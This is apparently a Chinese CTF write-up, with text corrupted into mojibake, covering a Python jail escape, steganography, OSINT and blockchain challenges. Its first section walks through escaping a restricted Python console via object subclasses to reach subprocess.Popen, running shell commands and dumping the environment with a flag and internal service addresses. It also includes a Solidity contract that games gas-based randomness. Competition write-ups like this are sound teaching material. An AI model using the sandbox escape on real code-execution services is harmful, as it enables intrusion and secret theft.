'werkzeug.exceptions.Aborter'>, <class 'werkzeug.datastructures.mixins.ImmutableListMixin'>, <class 'werkzeug.datastructures.mixins.ImmutableHeadersMixin'>, <class '_hashlib.HASH'>, <class '_hashlib.HMAC'>, <class '_blake2.blake2b'>, <class '_blake2.blake2s'>, <class 'urllib.request.Request'>, <class 'urllib.request.OpenerDirector'>, <class 'urllib.request.BaseHandler'>, <class 'urllib.request.HTTPPasswordMgr'>, <class 'urllib.request.AbstractBasicAuthHandler'>, <class 'urllib.request.AbstractDigestAuthHandler'>, <class 'urllib.request.URLopener'>, <class 'urllib.request.ftpwrapper'>, <class 'werkzeug.datastructures.auth.Authorization'>, <class 'werkzeug.datastructures.auth.WWWAuthenticate'>, <class 'werkzeug.datastructures.headers.Headers'>, <class 'werkzeug.datastructures.file_storage.FileStorage'>, <class 'werkzeug.datastructures.range.IfRange'>, <class 'werkzeug.datastructures.range.Range'>, <class 'werkzeug.datastructures.range.ContentRange'>, <class 'dataclasses._HAS_DEFAULT_FACTORY_CLASS'>, <class 'dataclasses._MISSING_TYPE'>, <class 'dataclasses._KW_ONLY_TYPE'>, <class 'dataclasses._FIELD_BASE'>, <class 'dataclasses.InitVar'>, <class 'dataclasses.Field'>, <class 'dataclasses._DataclassParams'>, <class 'werkzeug.sansio.multipart.Event'>, <class 'werkzeug.sansio.multipart.MultipartDecoder'>, <class 'werkzeug.sansio.multipart.MultipartEncoder'>, <class 'unicodedata.UCD'>, <class 'hmac.HMAC'>, <class 'werkzeug.wsgi.ClosingIterator'>, <class 'werkzeug.wsgi.FileWrapper'>, <class 'werkzeug.wsgi._RangeWrapper'>, <class 'werkzeug.formparser.FormDataParser'>, <class 'werkzeug.formparser.MultiPartParser'>, <class 'werkzeug.user_agent.UserAgent'>, <class 'werkzeug.sansio.request.Request'>, <class 'werkzeug.sansio.response.Response'>, <class 'werkzeug.wrappers.response.ResponseStream'>, <class 'werkzeug.test.EnvironBuilder'>, <class 'werkzeug.test.Client'>, <class 'werkzeug.test.Cookie'>, <class 'werkzeug.local.Local'>, <class 'werkzeug.local.LocalManager'>, <class 'werkzeug.local._ProxyLookup'>, <class 'decimal.Decimal'>, <class 'decimal.Context'>, <class 'decimal.SignalDictMixin'>, <class 'decimal.ContextManager'>, <class 'numbers.Number'>, <class 'uuid.UUID'>, <class 'flask.json.provider.JSONProvider'>, <class 'click._compat._FixupStream'>, <class 'click._compat._AtomicFile'>, <class 'click.utils.LazyFile'>, <class 'click.utils.KeepOpenFile'>, <class 'click.utils.PacifyFlushWrapper'>, <class 'click.types.ParamType'>, <class 'click.parser._Option'>, <class 'click.parser._Argument'>, <class 'click.parser._ParsingState'>, <class 'click.parser._OptionParser'>, <class 'click.formatting.HelpFormatter'>, <class 'click.core.Context'>, <class 'click.core.Command'>, <class 'click.core.Parameter'>, <class 'werkzeug.routing.converters.BaseConverter'>, <class 'difflib.SequenceMatcher'>, <class 'difflib.Differ'>, <class 'difflib.HtmlDiff'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class 'werkzeug.routing.rules.RulePart'>, <class 'werkzeug.routing.rules.RuleFactory'>, <class 'werkzeug.routing.rules.RuleTemplate'>, <class 'werkzeug.routing.matcher.State'>, <class 'werkzeug.routing.matcher.StateMachineMatcher'>, <class 'werkzeug.routing.map.Map'>, <class 'werkzeug.routing.map.MapAdapter'>, <class 'blinker._utilities.Symbol'>, <class 'blinker.base.Signal'>, <class 'flask.cli.ScriptInfo'>, <class 'flask.ctx._AppCtxGlobals'>, <class 'flask.ctx.AppContext'>, <class 'flask.ctx.RequestContext'>, <class 'jinja2.bccache.Bucket'>, <class 'jinja2.bccache.BytecodeCache'>, <class 'jinja2.utils._MissingType'>, <class 'jinja2.utils.LRUCache'>, <class 'jinja2.utils.Cycler'>, <class 'jinja2.utils.Joiner'>, <class 'jinja2.utils.Namespace'>, <class 'jinja2.nodes.EvalContext'>, <class 'jinja2.nodes.Node'>, <class 'jinja2.visitor.NodeVisitor'>, <class 'jinja2.idtracking.Symbols'>, <class 'jinja2.compiler.MacroRef'>, <class 'jinja2.compiler.Frame'>, <class 'jinja2.runtime.TemplateReference'>, <class 'jinja2.runtime.Context'>, <class 'jinja2.runtime.BlockReference'>, <class 'jinja2.runtime.LoopContext'>, <class 'jinja2.runtime.Macro'>, <class 'jinja2.runtime.Undefined'>, <class 'jinja2.lexer.Failure'>, <class 'jinja2.lexer.TokenStreamIterator'>, <class 'jinja2.lexer.TokenStream'>, <class 'jinja2.lexer.Lexer'>, <class 'jinja2.parser.Parser'>, <class 'jinja2.environment.Environment'>, <class 'jinja2.environment.Template'>, <class 'jinja2.environment.TemplateModule'>, <class 'jinja2.environment.TemplateExpression'>, <class 'jinja2.environment.TemplateStream'>, <class 'jinja2.loaders.BaseLoader'>, <class 'flask.sansio.scaffold.Scaffold'>, <class 'itsdangerous.signer.SigningAlgorithm'>, <class 'itsdangerous.signer.Signer'>, <class 'itsdangerous._json._CompactJSON'>, <class 'flask.json.tag.JSONTag'>, <class 'flask.json.tag.TaggedJSONSerializer'>, <class 'flask.sessions.SessionInterface'>, <class 'flask.sansio.blueprints.BlueprintSetupState'>, <class '_multiprocessing.SemLock'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>, <class 'multiprocessing.util.Finalize'>, <class 'multiprocessing.util.ForkAwareThreadLock'>, <class 'multiprocessing.connection._ConnectionBase'>, <class 'multiprocessing.connection.Listener'>, <class 'multiprocessing.connection.SocketListener'>, <class 'multiprocessing.connection.ConnectionWrapper'>, <class 'multiprocessing.queues.Queue'>, <class 'multiprocessing.queues.SimpleQueue'>, <class 'multiprocessing.synchronize.SemLock'>, <class 'multiprocessing.synchronize.Condition'>, <class 'multiprocessing.synchronize.Event'>, <class 'multiprocessing.popen_fork.Popen'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>]


```

2.

```
[x.__name__ for x in ().__class__.__bases__[0].__subclasses__()].index('Popen')


è¿”å›
559
```

3.

```
().__class__.__bases__[0].__subclasses__()[559](['ls'], stdout=-1).communicate()[0]

è¿”å›b'Dockerfile\napp.py\nrequirements.txt\nstatic\ntemplates\n'

().__class__.__bases__[0].__subclasses__()[559](['cat', 'app.py'], stdout=-1).communicate()[0]

è¿”å›
b'import time\nfrom multiprocessing import Process, Queue\nfrom flask import Flask, request, jsonify, render_template\n\napp = Flask(__name__)\n\n\ndef _worker(code: str, q: Queue):\n    import sys, os, warnings, io, traceback, code as code_mod\n\n    _ = (sys, os, warnings)\n\n    stdout_buf = io.StringIO()\n    orig_out, orig_err = sys.stdout, sys.stderr\n    sys.stdout = stdout_buf\n    sys.stderr = stdout_buf\n\n    try:\n        restricted_locals = {}\n        restricted_locals["__builtins__"] = {}\n        console = code_mod.InteractiveConsole(locals=restricted_locals)\n        for line in code.splitlines():\n            console.push(line)\n        console.push("")\n    except Exception:\n        traceback.print_exc()\n    finally:\n        sys.stdout, sys.stderr = orig_out, orig_err\n        q.put({\n            "stdout": stdout_buf.getvalue(),\n        })\n\n\ndef run_in_sandbox(code: str, timeout_sec: float = 2.0):\n    q = Queue()\n    p = Process(target=_worker, args=(code, q))\n    start = time.time()\n    p.start()\n    p.join(timeout=timeout_sec)\n    duration = time.time() - start\n    if p.is_alive():\n        p.terminate()\n        return {\n            "stdout": f"Timeout after {timeout_sec:.2f}s",\n            "time": duration,\n        }\n    try:\n        result = q.get(timeout=0.1)\n    except Exception:\n        result = {"stdout": "No output captured"}\n    result["time"] = duration\n    return result\n\n\n@app.get("/")\ndef index():\n    return render_template("index.html")\n\n\n@app.post("/api/run")\ndef api_run():\n    data = request.get_json(silent=True) or {}\n    code = data.get("code", "")\n    if not isinstance(code, str):\n        return jsonify({"error": "invalid payload"}), 400\n    result = run_in_sandbox(code)\n    return jsonify(result)\n\n\n@app.get("/health")\ndef health():\n    return "ok"\n\n\nif __name__ == "__main__":\n    app.run(host="0.0.0.0", port=8000, debug=True)'

env

è¿”å›
b'PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nHOSTNAME=challenge-019a392b-af8e-019a1b57-0ad5-87f4fc9f9-jrglv\nLANG=C.UTF-8\nGPG_KEY=7169605F62C751356D054A26A821E680E5FA6305\nPYTHON_VERSION=3.12.4\nPYTHON_PIP_VERSION=24.0\nPYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/ac00c61f60b2df101b7cdf90ed319b625ac93b42/public/get-pip.py\nPYTHON_GET_PIP_SHA256=0f8bb2652c0b0965f268312f49ec21e772d421d381af4324beea66b8acf2635c\nPYTHONDONTWRITEBYTECODE=1\nPYTHONUNBUFFERED=1\nFLAG=SYC{decent_jail_breaker_019a45743f837f3b8e8dc47d1cb2f85a}\nCHALLENGE_019A14B0_CA72_019A3446_5D58_PORT_80_TCP_PROTO=tcp\nCHALLENGE_019A2B37_D8ED_019A11A4_3A42_SERVICE_PORT_PORT_8080=8080\nCHALLENGE_019A2B37_D8ED_019A173B_A0B1_SERVICE_HOST=10.99.217.111\nCHALLENGE_019A14B0_CA72_019A1BE1_617A_PORT_80_TCP_PORT=80\nCHALLENGE_019A14F3_38E2_019A435F_1E6F_PORT=tcp://10.103.71.81:8080\nCHALLENGE_019A392B_AF8E_019A1B57_0AD5_PORT_8000_TCP_PORT=8000\nCHALLENGE_019A2F96_3005_019A3555_44F2_SERVICE_HOST=10.97.78.121\nCHALLENGE_019A2B37_D8ED_019A3D0B_DC2F_SERVICE_HOST=10.102.113.11\nCHALLENGE_019A14F3_38E2_019A435F_1E6F_PORT_8080_TCP_PROTO=tcp\nCHALLENGE_019A392B_AF8E_019A1B57_0AD5_SERVICE_PORT_PORT_8000=8000\nCHALLENGE_019A2F4D_887A_019A1190_1058_SERVICE_PORT_PORT_8080=8080\nCHALLENGE_019A2B37_D8ED_019A3D0B_DC2F_PORT=tcp://10.102.113.11:8080\nCHALLENGE_019A01D2_4CF4_019A1196_988B_PORT_80_TCP_ADDR=10.107.182.171\nCHALLENGE_019A120E_3F96_019A261C_4CA3_SERVICE_PORT_PORT_11451=11451\nCHALLENGE_019A2F4D_887A_019A1190_1058_PORT=tcp://10.111.236.152:8080\nCHALLENGE_019A14B0_CA72_019A3446_5D58_SERVICE_HOST=10.96.140.44\nCHALLENGE_019A2B37_D8ED_019A3D0B_DC2F_SERVICE_PORT_PORT_8080=8080\nKUBERNETES_SERVICE_PORT_HTTPS=443\nKUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443\nCHALLENGE_019A2B37_D8ED_019A173B_A0B1_SERVICE_PORT=8080\nCHALLENGE_019A01CB_B490_019A38D7_AF16_SERVICE_HOST=10.100.202.53\nCHALLENGE_019A14B0_CA72_019A1BE1_617A_SERVICE_PORT_PORT_80=80\nCHALLENGE_019A14B0_CA72_019A3446_5D58_SERVICE_PORT_PORT_80=80\nCHALLENGE_019A01CB_B490_019A38D7_AF16_SERVICE_PORT=8080\nCHALLENGE_019A2F96_3005_019A142D_6042_PORT_80_TCP=tcp://10.105.84.16:80\nCHALLENGE_019A2F96_3005_019A142D_6042_PORT_80_TCP_ADDR=10.105.84.16\nKUBERNETES_SERVICE_HOST=10.96.0.1\nCHALLENGE_019A2B37_D8ED_019A173B_A0B1_PORT_8080_TCP_ADDR=10.99.217.111\nCHALLENGE_019A14B0_CA72_019A1BE1_617A_SERVICE_PORT=80\nCHALLENGE_019A2B37_D8ED_019A11A4_3A42_PORT_8080_TCP_PROTO=tcp\nCHALLENGE_019A2F96_3005_019A3555_44F2_PORT=tcp://10.97.78.121:80\nCHALLENGE_019A01D2_4CF4_019A1196_988B_PORT=tcp://10.107.182.171:80\nCHALLENGE_019A14F3_38E2_019A435F_1E6F_PORT_8080_TCP=tcp://10.103.71.81:8080\nCHALLENGE_019A2F96_3005_019A11A4_3A42_PORT_80_TCP_ADDR=10.105.232.231\nCHALLENGE_019A2B37_D8ED_019A1608_2187_PORT_8080_TCP_PORT=8080\nCHALLENGE_019A14F3_38E2_019A435F_1E6F_SERVICE_PORT=8080\nCHALLENGE_019A2F4D_887A_019A1190_1058_SERVICE_HOST=10.111.236.152\nCHALLENGE_019A2F4D_887A_019A1190_1058_PORT_8080_TCP_PROTO=tcp\nCHALLENGE_019A2B37_D8ED_019A1608_2187_PORT_8080_TCP_ADDR=10.96.239.239\nCHALLENGE_019A120E_3F96_019A261C_4CA3_PORT_11451_TCP_ADDR=10.97.146.18\nCHALLENGE_019A14B0_CA72_019A1BE1_617A_SERVICE_HOST=10.99.158.173\nCHALLENGE_019A01D2_4CF4_019A1196_988B_SERVICE_PORT=80\nCHALLENGE_019A2F4D_887A_019A1190_1058_SERVICE_PORT=8080\nCHALLENGE_019A2B37_D8ED_019A173B_A0B1_PORT_8080_TCP_PROTO=tcp\nCHALLENGE_019A14B0_CA72_019A3446_5D58_SERVICE_PORT=80\nCHALLENGE_019A2F96_3005_019A142D_6042_PORT_80_TCP_PROTO=tcp\nCHALLENGE_019A01CB_B490_019A38D7_AF16_PORT_8080_TCP_PROTO=tcp\nCHALLENGE_019A2F4D_887A_019A1452_7100_PORT_8080_TCP=tcp://10.106.172.213:8080\nCHALLENGE_019A14F3_38E2_019A435F_1E6F_SERVICE_HOST=10.103.71.81\nKUBERNETES_PORT_443_TCP_ADDR=10.96.0.1\nCHALLENGE_019A2B37_D8ED_019A11A4_3A42_PORT_8080_TCP=tcp://10.110.210.228:8080\nCHALLENGE_019A2B37_D8ED_019A173B_A0B1_PORT_8080_TCP_PORT=8080\nCHALLENGE_019A14B0_CA72_019A3446_5D58_PORT_80_TCP_PORT=80\nCHALLENGE_019A2F96_3005_019A11A4_3A42_PORT_80_TCP_PROTO=tcp\nCHALLENGE_019A2F4D_887A_019A1452_7100_PORT=tcp://10.106.172.213:8080\nCHALLENGE_019A2F96_3005_019A3555_44F2_PORT_80_TCP_PROTO=tcp\nCHALLENGE_019A392B_AF8E_019A1B57_0AD5_PORT_8000_TCP=tcp://10.103.232.126:8000\nCHALLENGE_019A120E_3F96_019A261C_4CA3_PORT=tcp://10.97.146.18:11451\nCHALLENGE_019A2F4D_887A_019A1190_1058_PORT_8080_TCP_ADDR=10.111.236.152\nCHALLENGE_019A2B37_D8ED_019A1608_2187_SERVICE_PORT=8080\nCHALLENGE_019A2B37_D8ED_019A11A4_3A42_PORT_8080_TCP_ADDR=10.110.210.228\nCHALLENGE_019A2F4D_887A_019A1452_7100_SERVICE_HOST=10.106.172.213\nCHALLENGE_019A2F96_3005_019A11A4_3A42_SERVICE_PORT_PORT_80=80\nCHALLENGE_019A2F96_3005_019A142D_6042_PORT_80_TCP_PORT=80\nCHALLENGE_019A2F4D_887A_019A1452_7100_SERVICE_PORT=8080\nCHALLENGE_019A392B_AF8E_019A1B57_0AD5_SERVICE_HOST=10.103.232.126\nCHALLENGE_019A2F96_3005_019A11A4_3A42_PORT_80_TCP_PORT=80\nCHALLENGE_019A2B37_D8ED_019A11A4_3A42_SERVICE_PORT=8080\nCHALLENGE_019A2F96_3005_019A142D_6042_SERVICE_PORT_PORT_80=80\nCHALLENGE_019A2F96_3005_019A3555_44F2_SERVICE_PORT=80\nCHALLENGE_019A2B37_D8ED_019A3D0B_DC2F_PORT_8080_TCP=tcp://10.102.113.11:8080\nCHALLENGE_019A14B0_CA72_019A3446_5D58_PORT=tcp://10.96.140.44:80\nCHALLENGE_019A01CB_B490_019A38D7_AF16_PORT=tcp://10.100.202.53:8080\nCHALLENGE_019A120E_3F96_019A261C_4CA3_SERVICE_HOST=10.97.146.18\nCHALLENGE_019A2F96_3005_019A11A4_3A42_PORT_80_TCP=tcp://10.105.232.231:80\nKUBERNETES_PORT_443_TCP_PROTO=tcp\nCHALLENGE_019A2F96_3005_019A3555_44F2_PORT_80_TCP=tcp://10.97.78.121:80\nCHALLENGE_019A01D2_4CF4_019A1196_988B_SERVICE_HOST=10.107.182.171\nCHALLENGE_019A2F96_3005_019A11A4_3A42_SERVICE_HOST=10.105.232.231\nCHALLENGE_019A2F96_3005_019A142D_6042_SERVICE_PORT=80\nCHALLENGE_019A120E_3F96_019A261C_4CA3_PORT_11451_TCP=tcp://10.97.146.18:11451\nCHALLENGE_019A120E_3F96_019A261C_4CA3_PORT_11451_TCP_PORT=11451\nCHALLENGE_019A392B_AF8E_019A1B57_0AD5_PORT_8000_TCP_PROTO=tcp\nCHALLENGE_019A2F4D_887A_019A1190_1058_PORT_8080_TCP_PORT=8080\nCHALLENGE_019A2B37_D8ED_019A11A4_3A42_PORT_8080_TCP_PORT=8080\nCHALLENGE_019A14B0_CA72_019A3446_5D58_PORT_80_TCP_ADDR=10.96.140.44\nCHALLENGE_019A392B_AF8E_019A1B57_0AD5_SERVICE_PORT=8000\nKUBERNETES_SERVICE_PORT=443\nCHALLENGE_019A2B37_D8ED_019A1608_2187_SERVICE_HOST=10.96.239.239\nCHALLENGE_019A2B37_D8ED_019A3D0B_DC2F_PORT_8080_TCP_PORT=8080\nCHALLENGE_019A2F4D_887A_019A1452_7100_PORT_8080_TCP_PORT=8080\nCHALLENGE_019A14B0_CA72_019A1BE1_617A_PORT_80_TCP_PROTO=tcp\nCHALLENGE_019A2F96_3005_019A3555_44F2_PORT_80_TCP_ADDR=10.97.78.121\nCHALLENGE_019A120E_3F96_019A261C_4CA3_SERVICE_PORT=11451\nCHALLENGE_019A2B37_D8ED_019A11A4_3A42_SERVICE_HOST=10.110.210.228\nCHALLENGE_019A2B37_D8ED_019A173B_A0B1_SERVICE_PORT_PORT_8080=8080\nCHALLENGE_019A2B37_D8ED_019A173B_A0B1_PORT=tcp://10.99.217.111:8080\nCHALLENGE_019A2B37_D8ED_019A173B_A0B1_PORT_8080_TCP=tcp://10.99.217.111:8080\nCHALLENGE_019A120E_3F96_019A261C_4CA3_PORT_11451_TCP_PROTO=tcp\nCHALLENGE_019A14F3_38E2_019A435F_1E6F_PORT_8080_TCP_PORT=8080\nCHALLENGE_019A2B37_D8ED_019A1608_2187_SERVICE_PORT_PORT_8080=8080\nCHALLENGE_019A2B37_D8ED_019A1608_2187_PORT_8080_TCP_PROTO=tcp\nCHALLENGE_019A2B37_D8ED_019A11A4_3A42_PORT=tcp://10.110.210.228:8080\nCHALLENGE_019A14B0_CA72_019A1BE1_617A_PORT_80_TCP_ADDR=10.99.158.173\nCHALLENGE_019A01CB_B490_019A38D7_AF16_PORT_8080_TCP_PORT=8080\nCHALLENGE_019A2F96_3005_019A3555_44F2_SERVICE_PORT_PORT_80=80\nCHALLENGE_019A01D2_4CF4_019A1196_988B_SERVICE_PORT_PORT_80=80\nCHALLENGE_019A01CB_B490_019A38D7_AF16_PORT_8080_TCP_ADDR=10.100.202.53\nCHALLENGE_019A01D2_4CF4_019A1196_988B_PORT_80_TCP=tcp://10.107.182.171:80\nCHALLENGE_019A01D2_4CF4_019A1196_988B_PORT_80_TCP_PORT=80\nCHALLENGE_019A14F3_38E2_019A435F_1E6F_SERVICE_PORT_PORT_8080=8080\nCHALLENGE_019A01D2_4CF4_019A1196_988B_PORT_80_TCP_PROTO=tcp\nCHALLENGE_019A392B_AF8E_019A1B57_0AD5_PORT_8000_TCP_ADDR=10.103.232.126\nCHALLENGE_019A2F96_3005_019A11A4_3A42_SERVICE_PORT=80\nCHALLENGE_019A2F96_3005_019A11A4_3A42_PORT=tcp://10.105.232.231:80\nCHALLENGE_019A2B37_D8ED_019A1608_2187_PORT_8080_TCP=tcp://10.96.239.239:8080\nCHALLENGE_019A2F4D_887A_019A1452_7100_SERVICE_PORT_PORT_8080=8080\nKUBERNETES_PORT=tcp://10.96.0.1:443\nCHALLENGE_019A2F96_3005_019A142D_6042_SERVICE_HOST=10.105.84.16\nCHALLENGE_019A2F4D_887A_019A1452_7100_PORT_8080_TCP_ADDR=10.106.172.213\nCHALLENGE_019A14F3_38E2_019A435F_1E6F_PORT_8080_TCP_ADDR=10.103.71.81\nCHALLENGE_019A2B37_D8ED_019A3D0B_DC2F_PORT_8080_TCP_ADDR=10.102.113.11\nCHALLENGE_019A392B_AF8E_019A1B57_0AD5_PORT=tcp://10.103.232.126:8000\nKUBERNETES_PORT_443_TCP_PORT=443\nCHALLENGE_019A2B37_D8ED_019A1608_2187_PORT=tcp://10.96.239.239:8080\nCHALLENGE_019A2F96_3005_019A142D_6042_PORT=tcp://10.105.84.16:80\nCHALLENGE_019A2F4D_887A_019A1452_7100_PORT_8080_TCP_PROTO=tcp\nCHALLENGE_019A2F96_3005_019A3555_44F2_PORT_80_TCP_PORT=80\nCHALLENGE_019A2B37_D8ED_019A3D0B_DC2F_SERVICE_PORT=8080\nCHALLENGE_019A2B37_D8ED_019A3D0B_DC2F_PORT_8080_TCP_PROTO=tcp\nCHALLENGE_019A2F4D_887A_019A1190_1058_PORT_8080_TCP=tcp://10.111.236.152:8080\nCHALLENGE_019A01CB_B490_019A38D7_AF16_SERVICE_PORT_PORT_8080=8080\nCHALLENGE_019A14B0_CA72_019A1BE1_617A_PORT=tcp://10.99.158.173:80\nCHALLENGE_019A14B0_CA72_019A1BE1_617A_PORT_80_TCP=tcp://10.99.158.173:80\nCHALLENGE_019A14B0_CA72_019A3446_5D58_PORT_80_TCP=tcp://10.96.140.44:80\nCHALLENGE_019A01CB_B490_019A38D7_AF16_PORT_8080_TCP=tcp://10.100.202.53:8080\nHOME=/root\nSERVER_SOFTWARE=gunicorn/23.0.0\n'

å¾—åƒ
SYC{decent_jail_breaker_019a45743f837f3b8e8dc47d1cb2f85a}
```

# http

då‚æ•°å€¼ç”¨base64è§£å¯†æ‹¼æ¥èµ·æ¥



# osint

å›¾ç‰‡æœ‰gpsä¿¡æ¯ï¼Œä¸¢ç»™aiï¼Œä¼šå‘Šè¯‰ä½ æ˜¯å¤©å›å…¬å›­



# evil_mcp

æ­£å¸¸æŠŠä¿¡æ¯éƒ½ç»™aiä¼šç»™ä¸€ä¸ªopen flagçš„ä»£ç ï¼Œç„¶åå°±å¤šæŒ‰å‡ ä¸‹å°±è¡Œï¼ŒæœåŠ¡å™¨å¯èƒ½æœ‰ç‚¹å¡ï¼ˆ



# Bite off picture

010çœ‹æœ«å°¾æ„Ÿè§‰å€’è¿‡æ¥åƒbaseï¼Œcyberchefå¼„å‡ºå¯†ç ï¼Œå›¾ç‰‡ä¸¢éšæ³¢é€æµä¿®å¤é«˜å®½



# Blockchain Signin

æœäº¤æ˜“åœ°å€ç„¶åä¹±ç¿»è·å¾—flag



# 1z_sign

é¢æœäº¤æ˜“åœ°å€ï¼ŒæŠŠdetailç»™aiå°±è¡Œ



# hidden

å…ˆå½“å‹ç¼©åŒ…è§£å‹ï¼Œæœ‰flag2å’Œflag3

flag2     362geydgwunkdwee



flag3éšæ³¢é€æµä¿®æ–‡ä»¶å¤´ sjdmd}


document.xmlçœ‹åˆ°flag1äº†     SYC{adsad



SYC{adsad362geydgwunkdweesjdmd}



# Dream

ç›´æ¥æŠŠå¾—åˆ°çš„å†…å®¹16è¿›åˆ¶è§£ç å¾—åˆ°

```
`Â€`@R4Â€`W_Â€Ã½[P`6`&W_5`Ã Â€cÃÂš}`*W[_Â€Ã½[`0`DV[`@Q`;Â‘Â`|V[`@QÂ€Â‘ÂÃ³[_wSYC{w3lc0m3t0bl0ckcha1n}Â€_R` _Ã³[_ÂÂPÂ‘ÂPV[`vÂ`fV[Â‚RPPV[_` Â‚ÂP`Â_ÂƒÂ„`oV[Â’Â‘PPVÃ¾Â¢dipfsX" Â—K?!l61Â¶Â”Â±Ã»RÃ¸ÃˆÃ†Â«yz$i|bÃ«Ã˜%"Â¸Ã¨dsolcC
```



# Point

```
åœ°å€1    0xd53C8dB965d605e897b833aE0D72b78c7651689B
åœ°å€2    0x0F73c6AdE15239662eB82167cd55c99c4665F39A
åœ°å€3    0x8d835274Fd5878ED5011d9CCC73537a3De3a36d2
```

å¤šç‚¹å‡ ä¸‹good_luckæœ‰10ç‚¹ï¼ˆä½ åˆ«è¯´æˆ‘ä¹Ÿä¸çŸ¥é“æ˜¯ä¸ºä»€ä¹ˆ,åé¢è¯•åˆä¸ç»™äº†



çœŸæ­£è§£æ³•æ˜¯éƒ¨ç½²å¤šå‡ ä¸ª

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HufflepuffCoinAttack {
    function getValue() external view returns (uint256) {
        return gasleft()%2;
    }
}
```

ç„¶åå»ç”¨é‚£ä¸ª+10çš„ï¼Œå¤šå¼„å‡ ä¸ªå°±è¡Œï¼Œ

# gift

å‹ç¼©åŒ…ï¼Œè¿˜æ˜¯åœ¨æœ€åè—å¯†ç 

bmp ç›²æ°´å°  ç”¨éšæ³¢é€æµä¸€æŠŠæ¢­äº†



# CRDT

è¿˜åŸè„šæœ¬

```
import json
from collections import defaultdict


def restore_document_from_file(filename):
    """
    ä»JSONæ–‡ä»¶è¯»å–CRDTæ“ä½œå¹¶è¿˜åŸæ–‡æ¡£
    """
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            operations = json.load(f)
    except FileNotFoundError:
        print(f"é”™è¯¯ï¼šæ‰¾ä¸åˆ°æ–‡ä»¶ {filename}")
        return None
    except json.JSONDecodeError:
        print(f"é”™è¯¯ï¼š{filename} ä¸æ˜¯æœ‰æ•ˆçš„JSONæ–‡ä»¶")
        return None

    print(f"âœ“ æˆåŠŸè¯»å– {filename}ï¼Œå…± {len(operations)} æ¡æ“ä½œ")
    print("-" * 50)

    # ç»Ÿè®¡æ“ä½œç±»å‹
    ins_count = sum(1 for op in operations if op.get('op') == 'ins')
    del_count = sum(1 for op in operations if op.get('op') == 'del')
    print(f"æ’å…¥æ“ä½œï¼š{ins_count} æ¡")
    print(f"åˆ é™¤æ“ä½œï¼š{del_count} æ¡")
    print("-" * 50)

    # æ”¶é›†æ‰€æœ‰æ’å…¥å’Œåˆ é™¤æ“ä½œ
    insertions = {}
    deletions = set()

    for op in operations:
        if op.get('op') == 'ins':
            op_id = op['id']
            insertions[op_id] = {
                'parent': op['parent'],
                'ch': op['ch'],
                'site': op['site'],
                'ctr': op['ctr']
            }
        elif op.get('op') == 'del':
            deletions.add(op['id'])

    # è¿‡æ»¤å‡ºæ´»è·ƒçš„å­—ç¬¦ï¼ˆæœªè¢«åˆ é™¤çš„ï¼‰
    active = {
        id: info for id, info in insertions.items()
        if id not in deletions
    }

    print(f"\næ´»è·ƒå­—ç¬¦æ•°ï¼š{len(active)}")
    print(f"åˆ é™¤å­—ç¬¦æ•°ï¼š{len(deletions)}")
    print("-" * 50)

    # æ„å»ºæ ‘ç»“æ„ï¼ˆparent -> childrenï¼‰
    children = defaultdict(list)

    for id, info in active.items():
        parent = info['parent']
        children[parent].append((id, info))

    # æŒ‰ç…§ (site, ctr) æ’åºå­èŠ‚ç‚¹
    for parent_id in children:
        children[parent_id].sort(
            key=lambda x: (x[1]['site'], x[1]['ctr'])
        )

    # æ·±åº¦ä¼˜å…ˆéå†æ ‘ï¼Œæ„å»ºæœ€ç»ˆæ–‡æ¡£
    def traverse(node_id):
        result = ""
        for child_id, child_info in children[node_id]:
            result += child_info['ch']
            result += traverse(child_id)
        return result

    final_document = traverse('HEAD')

    return final_document


# ä¸»ç¨‹åº
if __name__ == "__main__":
    print("\n" + "=" * 50)
    print("     CRDT æ–‡æ¡£è¿˜åŸå·¥å…·")
    print("=" * 50 + "\n")

    result = restore_document_from_file('1.json')

    if result:
        print("\nâœ“ æ–‡æ¡£è¿˜åŸå®Œæˆï¼")
        print("=" * 50)
        print("\nã€æœ€ç»ˆæ–‡æ¡£å†…å®¹ã€‘\n")
        print(result)
        print("\n" + "=" * 50)
        print(f"\næ–‡æ¡£é•¿åº¦ï¼š{len(result)} ä¸ªå­—ç¬¦")
        print(f"æ–‡æ¡£è¡Œæ•°ï¼š{result.count(chr(10)) + 1} è¡Œ")

        # ä¿å­˜åˆ°è¾“å‡ºæ–‡ä»¶
        with open('output.txt', 'w', encoding='utf-8') as f:
            f.write(result)
        print("\nâœ“ ç»“æœå·²ä¿å­˜åˆ° output.txt")
```



```
==================================================

ã€æœ€ç»ˆæ–‡æ¡£å†…å®¹ã€‘

SYC{CRDT_RGA_CHALLENGE_IS_SO_EASY}

==================================================
```

# Echo

ç»è¿‡åˆ†æå†™å‡ºè„šæœ¬

```
ä»è§£ç ç»“æœçœ‹ï¼Œè¿™ä¸ªå®ç°ä½¿ç”¨äº†ï¼š

å›ºå®šå»¶è¿Ÿ: 1102æ ·æœ¬ â‰ˆ 25ms

å›ºå®šå¹…åº¦: çº¦0.3

å›ºå®šæ®µé•¿: 0.1ç§’

æ¯”ç‰¹ç¼–ç : é€šè¿‡ç›¸å…³æ€§é˜ˆå€¼åˆ¤æ–­0/1

text
æ¯”ç‰¹'1' â†’ å¼ºç›¸å…³æ€§ï¼ˆæ˜æ˜¾å›å£°ï¼‰
æ¯”ç‰¹'0' â†’ å¼±ç›¸å…³æ€§ï¼ˆå¾®å¼±æˆ–æ— å›å£°ï¼‰
```

ç¬¬ä¸€æ¬¡ï¼š

```
æˆ‘æœ‰ä¸€ä¸ªéŸ³é¢‘æ–‡ä»¶1.wavï¼Œç¡®å®šä½¿ç”¨äº†Echo hidingæ–¹æ³•æ¥éšè—ä¿¡æ¯ï¼Œç›®å‰åªæœ‰è¿™ä¸ªéŸ³é¢‘æ–‡ä»¶ï¼Œæœ‰æ–¹æ³•æå–å‡ºéšè—çš„ä¿¡æ¯å—ï¼Œä¿¡æ¯çš„å‰ä¸‰ä¸ªå­—ç¬¦åº”è¯¥æ˜¯SYC

import numpy as np
import matplotlib.pyplot as plt
from scipy.io import wavfile
from scipy import signal
import warnings
warnings.filterwarnings('ignore')

class EchoHidingAnalyzer:
